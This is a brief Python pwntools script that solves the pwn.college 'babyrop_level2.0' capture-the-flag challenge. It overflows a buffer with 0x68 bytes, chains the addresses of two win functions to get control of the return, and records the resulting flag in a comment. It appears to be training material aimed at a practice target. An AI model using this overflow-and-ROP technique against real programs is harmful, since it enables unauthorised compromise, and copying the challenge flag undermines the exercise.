from pwn import *

elf = ELF("./babyrop_level2.0")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
win1 = elf.sym[b'win_stage_1']
win2 = elf.sym[b'win_stage_2']

io = s.process("/challenge/babyrop_level2.0")
io.send(b'a'*0x68 + p64(win1) + p64(win2))

io.interactive()
# Flag: pwn.college{MEUa-yAF1TUoxarAFxYM8op8h5f.01M0MDLxIjNyEzW}